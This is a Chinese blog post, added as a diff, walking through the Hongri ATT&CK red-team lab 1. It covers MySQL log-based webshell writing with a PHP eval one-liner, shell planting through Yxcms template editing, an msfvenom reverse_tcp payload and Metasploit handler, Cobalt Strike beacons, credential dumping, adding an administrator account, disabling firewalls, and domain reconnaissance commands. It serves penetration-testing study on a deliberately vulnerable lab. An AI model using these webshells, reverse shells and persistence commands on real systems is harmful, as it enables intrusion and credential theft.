@@ -1,0 +1,669 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>红日靶场1 - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/7.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="红日靶场1">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2023-02-08 17:06" pubdate>
+        2023年2月8日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      42
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">红日靶场1</h1>
+            
+            <div class="markdown-body">
+              <h1 id="ATT-amp-CK实战系列——红队实战-一"><a href="#ATT-amp-CK实战系列——红队实战-一" class="headerlink" title="ATT&amp;CK实战系列——红队实战(一)"></a>ATT&amp;CK实战系列——红队实战(一)</h1><p>最开始搭好环境后打了一部分搁置了一段时间，渗透入门，就是中间有很多怪怪的问题，<br>[toc]</p>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strikeji-ben-shi-yong/jian-ting-qi-listener">Cobalt Strike使用手册</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10076#toc-10">https://xz.aliyun.com/t/10076#toc-10</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/A3MIuT7RXTIIPNLjF42OTg">https://mp.weixin.qq.com/s/A3MIuT7RXTIIPNLjF42OTg</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/107797189">cs之beacon</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5a652085f2c1">cs基本命令</a><br><a href=":">cs文档</a><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html">https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html</a><br><a target="_blank" rel="noopener" href="http://www.caiyuhuan.com/index.php/article/lian_fengdingbin_/132.html">cs和msf会话互传</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8394#toc-9">靶场记录</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2536">基本命令</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10313">windows主机信息收集</a></p>
+<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6954274454302097416">Windows信息收集</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/hack-info/">主机信息收集</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.wangan.com/p/7fygf36b9df57f04">内网信息收集</a></p>
+<p><a target="_blank" rel="noopener" href="https://shu1l.github.io/2020/04/27/msf-fan-dan-payload-xue-xi/">msf反弹payload学习</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/03/08/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E5%9F%9F%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">内网信息收集</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8001">内网渗透代理</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/R0ser1/p/14362067.html#%E6%90%AD%E5%BB%BA%E4%BB%A3%E7%90%86">meterpreter后渗透</a></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111190013726.png" srcset="/img/loading.gif" lazyload alt="image-20230111190013726"></p>
+<p>Windows2003、Windows Server 2008网络适配器设置为自定义(VMnet1仅主机模式)；攻击机我这里用的是物理机关一个网卡VM1就无法再访问到两台内网主机。此时Win7、Windows2003、Windows Server 2008处于同一内网中，攻击机只能先拿下win7，再通过win7访问内网进行横向渗透；</p>
+<ul>
+<li>Kali:192.168.47.1</li>
+<li>Win7:外网192.168.47.128  内网193.168.52.143</li>
+<li>Windows2003:192.168.52.141</li>
+<li>Windows Server 2008:192.168.52.138</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/489f2fdc60bd4c75a0489b8eefddb849.png" srcset="/img/loading.gif" lazyload alt="请添加图片描述"></p>
+<h2 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>其实这种靶场因为涉及的机子就三台，也没有什么子域名要收集，基本上就已知的三个ip，所以真要说信息收集也真没啥要收集的，直接就一个供外网能访问的站了。但是要涉及一些目标比较大，子域名等等信息比较多的渗透的时候，信息收集就很重要了，这个回头再总结吧。</p>
+<p>入口是个php探针，里面很容易发现服务器主机名，管理员邮箱<a href="mailto:&#x61;&#x64;&#109;&#x69;&#x6e;&#64;&#x70;&#104;&#112;&#83;&#x74;&#117;&#x64;&#x79;&#x2e;&#110;&#101;&#116;">&#x61;&#x64;&#109;&#x69;&#x6e;&#64;&#x70;&#104;&#112;&#83;&#x74;&#117;&#x64;&#x79;&#x2e;&#110;&#101;&#116;</a>等等敏感信息。</p>
+<p><img src="https://img-blog.csdnimg.cn/aad05487d71a44ad90e58bbcc401ced3.png" srcset="/img/loading.gif" lazyload alt="请添加图片描述"></p>
+<p>进而也能看到phpinfo</p>
+<p><img src="https://img-blog.csdnimg.cn/6d38bdc0c88645d2a3cbb720aa426662.png" srcset="/img/loading.gif" lazyload alt="请添加图片描述"></p>
+<p>扫下IP看看开了哪些端口，然后扫下目录。很明显发现有 phpMyAdmin，还有shell.php（这个是我之前传的）。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111191645848.png" srcset="/img/loading.gif" lazyload alt="image-20230111191645848"></p>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><h4 id="从mysql-getshell"><a href="#从mysql-getshell" class="headerlink" title="从mysql getshell"></a>从mysql getshell</h4><p>访问phpMyAdmin，测试一下mysql用户密码，这里账号密码root/root很容易试出来。</p>
+<p>先查询一下能否写文件，NULL说禁止写文件。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111191918489.png" srcset="/img/loading.gif" lazyload alt="image-20230111191918489"></p>
+<p>看看能否通过日志getshell。<code>SET GLOBAL general_log=&#39;on&#39;</code>打开general_log日志读写功能。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111192219562.png" srcset="/img/loading.gif" lazyload alt="image-20230111192219562"></p>
+<p><code>SET GLOBAL general_log_file = &#39;C:/phpStudy/WWW/kkfine.php&#39;;&#39;</code>创建一个<code>shell.php</code>作为日志文件，然后查询<code>SELECT &#39;&lt;?php @eval($_POST[kkfine]);?&gt;&#39;</code>即可写马。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111192756681.png" srcset="/img/loading.gif" lazyload alt="image-20230111192756681"></p>
+<h4 id="从cms-getshell"><a href="#从cms-getshell" class="headerlink" title="从cms getshell"></a>从cms getshell</h4><p>其实靶场还搭了一个Yxcms <a target="_blank" rel="noopener" href="http://192.168.47.128/yxcms/%EF%BC%8C%E8%BF%99%E6%98%AF%E5%8F%AF%E4%BB%A5%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E5%8F%91%E7%8E%B0%E7%9A%84%E3%80%82%E6%9F%A5%E8%AF%A2%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%EF%BC%8Cmd5%E7%88%86%E7%A0%B4%E5%90%8E%E4%B8%BA949ba59abbe56e05%EF%BC%8C%E4%BD%86%E4%BA%8B%E5%AE%9E%E4%B8%8A%E5%90%8E%E5%8F%B0%E5%BA%94%E8%AF%A5%E4%B8%8D%E6%98%AF%E5%8F%AA%E7%94%A8%E4%BA%86md5%E5%8A%A0%E5%AF%86%EF%BC%8C%E6%9C%80%E7%BB%88%E7%94%A8%E9%BB%98%E8%AE%A4%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81admin/123456%E7%99%BB%E5%BD%95%E8%BF%9B%E5%85%A5%E3%80%82">http://192.168.47.128/yxcms/，这是可以从数据库中发现的。查询管理员用户密码，md5爆破后为949ba59abbe56e05，但事实上后台应该不是只用了md5加密，最终用默认用户密码admin/123456登录进入。</a></p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111193451869.png" srcset="/img/loading.gif" lazyload alt="image-20230111193451869"></p>
+<p>进入后台发现可以编辑后台模板文件，直接写马</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111195055904.png" srcset="/img/loading.gif" lazyload alt="image-20230111195055904"></p>
+<p>同样getshell</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111195111219.png" srcset="/img/loading.gif" lazyload alt="image-20230111195111219"></p>
+<h4 id="msf接受shell"><a href="#msf接受shell" class="headerlink" title="msf接受shell"></a>msf接受shell</h4><p>有很多方式可以弹shell到msf，参考<a target="_blank" rel="noopener" href="https://shu1l.github.io/2020/04/27/msf-fan-dan-payload-xue-xi/">文章</a>利用msf生成一个php文件。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">msfvenom -p php/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=&lt;Your<span class="hljs-built_in"> IP </span>Address&gt; <span class="hljs-attribute">LPORT</span>=&lt;Your<span class="hljs-built_in"> Port </span><span class="hljs-keyword">to</span> Connect On&gt; -f<span class="hljs-built_in"> raw </span>&gt; shell.php　<br></code></pre></div></td></tr></table></figure>
+
+<p>然后监听</p>
+<figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">php</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost 192.168.101.3</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 4444</span><br>exploit <span class="hljs-comment">-j</span><br></code></pre></div></td></tr></table></figure>
+
+<p>访问shell.php即可收到shell</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111225227115.png" srcset="/img/loading.gif" lazyload alt="image-20230111225227115"></p>
+<h4 id="cs上线"><a href="#cs上线" class="headerlink" title="cs上线"></a>cs上线</h4><p>cs上线也很简单添加监听器生成exe文件就行，不过真实的渗透肯定需要一些免杀马。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111230631796.png" srcset="/img/loading.gif" lazyload alt="image-20230111230631796"></p>
+<h3 id="维持权限"><a href="#维持权限" class="headerlink" title="维持权限"></a>维持权限</h3><p>这一块的话以后再说吧，涉及到windows知识等等还没学会。</p>
+<h3 id="收集windows信息"><a href="#收集windows信息" class="headerlink" title="收集windows信息"></a>收集windows信息</h3><p><strong>常用命令</strong></p>
+<p>下面一些命令需要主机是域成员才能执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">net use  查看ipc连接情况<br>net user /domain 获取域用户列表<br>net user <span class="hljs-built_in">test</span> 123 /add 添加用户<br>neet localgroup administrators <span class="hljs-built_in">test</span> /add 添加<span class="hljs-built_in">test</span>用户到管理组，一般情况下，管理组才能远程桌面<br>net group /domain 查询域里面的组<br>net group <span class="hljs-string">&quot;domain admins&quot;</span> /domain 获取域管理员列表<br>net group <span class="hljs-string">&quot;enterprise admins&quot;</span> /domain   查看当前域中企业管理员组用户<br>net group <span class="hljs-string">&quot;domain computers&quot;</span> /domain    查看当前域中的所有的计算机名（登录过该域的计算机）<br>net group <span class="hljs-string">&quot;exchange servers&quot;</span> /domain    查看域内是否存在Exchange<br>net group <span class="hljs-string">&quot;domain controllers&quot;</span> /domain 查看域控制器(如果有多台)<br>net config workstation  查看当前登录域<br>net view 查看同一域内机器列表<br>net view \\ip 查看某IP共享<br>net view \\<span class="hljs-built_in">test</span> 查看<span class="hljs-built_in">test</span>计算机的共享资源列表<br>net view /domain 查看内网存在多少个域<br>Net view /domain:<span class="hljs-built_in">test</span> 查看<span class="hljs-built_in">test</span>域中的机器列表<br>wmic useraccount get Caption,sid    获取域内所有用户sid<br>setspn -T target.com -Q */*     获取当前域内所有spn<br><span class="hljs-keyword">for</span> /l %i <span class="hljs-keyword">in</span> (1,1,255) <span class="hljs-keyword">do</span> @ping 192.168.0.%i -w 1 -n 1 | find /i<span class="hljs-string">&quot;ttl&quot;</span><br><span class="hljs-keyword">for</span> /l %i <span class="hljs-keyword">in</span> (1,1,255) <span class="hljs-keyword">do</span> @ping 10.10.10.%i -w 1 -n 1 | find /i<span class="hljs-string">&quot;ttl&quot;</span><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>网络信息查找</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ipconfig /all   查看当前主机的主机名/IP/DNS等信息<br>route <span class="hljs-built_in">print</span> 查看路由表信息<br>netstat -ano    查看端口开放情况，有些时候能获取到别的IP段<br>arp -a  查看arp解析情况<br></code></pre></div></td></tr></table></figure>
+
+<p>寻找内网网段时建议被动寻找，主动寻找动静太大，如nmap、nbtscan这种一扫，可能整个网段内存活的机器就出来了，但随之而来的是IDS的流量审计，一旦引起流量异常被蓝队察觉，可能就会导致我们权限的丢失，永远不要小瞧蓝队，而且还是拥有各种安全设备的蓝队，内网渗透一定要谨慎，大规模资产扫描，自动化漏洞扫描我一般会留到最后才上的。</p>
+<p><strong>定位域控</strong></p>
+<p>查看域时间，一般域控会做时间服务器</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">net time /domain<br></code></pre></div></td></tr></table></figure>
+
+<p>通过dns定位域控</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ipconfig /allipconfig /displaydns   有些时候可以在dns缓存得到域控信息<br></code></pre></div></td></tr></table></figure>
+
+<p>利用netdom获取域控列表，得到域控名称可通过ping获取域控IP</p>
+<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs graphql">netdom query dc<br></code></pre></div></td></tr></table></figure>
+
+<p>查看防火墙状态</p>
+<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">windows<span class="hljs-built_in"> server </span>2003及以下版本:<br>netsh<span class="hljs-built_in"> firewall </span>show config<br>window<span class="hljs-built_in"> server </span>2003以上版本：<br>netsh advfirewall show allprofiles state<br><br>Windows<span class="hljs-built_in"> server </span>2003及之前版本：<br>netsh<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">set</span> opmode <span class="hljs-builtin-name">disable</span>  #关闭  <br>netsh<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">set</span> opmode <span class="hljs-builtin-name">enable</span>   #开启<br>Windows<span class="hljs-built_in"> server </span>2003之后版本：<br>netsh advfirewall <span class="hljs-builtin-name">set</span> allprofiles state off  #关闭    <br>netsh advfirewall <span class="hljs-builtin-name">set</span> allprofiles state on   #开启<br><br>修改防火墙规则<br>Windows<span class="hljs-built_in"> server </span>2003及以下版本，允许指定端口、程序连接：<br>netsh<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> portopening tcp 4444 test   #指定端口    <br>    netsh<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> allowedprogram c:\a.exe test <span class="hljs-builtin-name">enable</span>   #指定程序<br>Windows<span class="hljs-built_in"> server </span>2003之后版本，允许指定端口、程序进站、出站：<br>netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=test <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">protocol</span>=tcp <span class="hljs-attribute">localport</span>=4444  #允许4444端口进站  <br>    netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=test <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">program</span>=c:\a.exe  #允许a.exe进站  <br>    netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=test <span class="hljs-attribute">dir</span>=out <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">protocol</span>=tcp <span class="hljs-attribute">localport</span>=4444   #允许4444端口出站    <br>    netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=test <span class="hljs-attribute">dir</span>=out <span class="hljs-attribute">action</span>=allow <span class="hljs-attribute">program</span>=c:\a.exe   #允许a.exe出站<br><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>其它信息查找</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">systeminfo  查看补丁情况，也能看到当前机器是否加入域环境<br>net group <span class="hljs-string">&quot;domain controllers&quot;</span> /domain  查询域控<br>nslookup -<span class="hljs-built_in">type</span>=SRV _ldap._tcp.corp  通过srv记录获取域控地址<br>nltest /dclist:corp     使用nltest查询域控列表<br>tasklist /svc   查看进程及对应服务名<br>cmdkey /l   查看当前保存的登陆凭证<br><span class="hljs-built_in">type</span> c:\Windows\system32\drivers\etc\hosts  可以发现些内网IP<br></code></pre></div></td></tr></table></figure>
+
+<p>查询操作系统和版本信息</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">systeminfo | findstr <span class="hljs-string">/B</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS 名称&quot;</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS 版本&quot;</span><br>systeminfo | findstr <span class="hljs-string">/B</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS Name&quot;</span> <span class="hljs-string">/C</span>:<span class="hljs-string">&quot;OS Version&quot;</span><br></code></pre></div></td></tr></table></figure>
+
+<h4 id="主机信息"><a href="#主机信息" class="headerlink" title="主机信息"></a>主机信息</h4><p>利用cs提权</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230114020239866.png" srcset="/img/loading.gif" lazyload alt="image-20230114020239866"></p>
+<p>提取用户密码，得到管理员密码</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230114005541485.png" srcset="/img/loading.gif" lazyload alt="image-20230114005541485"></p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230114005533407.png" srcset="/img/loading.gif" lazyload alt="image-20230114005533407"></p>
+<p>查询用户列表</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111233759426.png" srcset="/img/loading.gif" lazyload alt="image-20230111233759426"></p>
+<p><code>whoami /all</code>查看当前用户以及当前用户所处的用户组的一些信息，综合判断需不需要提权，这里直接就是adminstrator。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111232232254.png" srcset="/img/loading.gif" lazyload alt="image-20230111232232254"></p>
+<p>查看网络配置信息，可以发现有三个ip，<code>192.168.52.143</code>大概率就是内网ip地址了。还可以看到在<code>god.org</code>这个域中，并且在域环境中，DNS服务器的IP地址通常为域控制器地址，所以<code>192.168.52.143</code>的DNS地址<code>192.168.52.138</code>也很大可能是域控ip。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111232617455.png" srcset="/img/loading.gif" lazyload alt="image-20230111232617455"></p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111232650660.png" srcset="/img/loading.gif" lazyload alt="image-20230111232650660"></p>
+<p>查看与dns服务器是否在同一ip上。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111233142321.png" srcset="/img/loading.gif" lazyload alt="image-20230111233142321"></p>
+<p>查看系统详细信息，可以发现也是在域中的。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111233238400.png" srcset="/img/loading.gif" lazyload alt="image-20230111233238400"></p>
+<p>从hosts文件也能看出来。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111232512823.png" srcset="/img/loading.gif" lazyload alt="image-20230111232512823"></p>
+<p>查询当前登陆域及登陆用户信息</p>
+<p>显示项的“工作站域 DNS 名称”即域名（若为“WORKGROUP”则表示不在域中），“登录域”用于表示当前登录的用户是域用户还是本地用户。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111233428621.png" srcset="/img/loading.gif" lazyload alt="image-20230111233428621"></p>
+<p>利用cs dump下用户hash。</p>
+<h4 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h4><figure class="highlight dos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain<br></code></pre></div></td></tr></table></figure>
+
+<p>该命令用于判断主域（域服务器通常会同时作为时间服务器使用），执行后通常会有如下三种情况：</p>
+<p>存在域，但当前用户不是域用户。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111233515403.png" srcset="/img/loading.gif" lazyload alt="image-20230111233515403"></p>
+<p>存在域，且当前用户是域用户。</p>
+<p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20230111233608297.png" srcset="/img/loading.gif" lazyload alt="image-20230111233608297"></p>
+<p>当前网络环境为工作组，不存在域。</p>
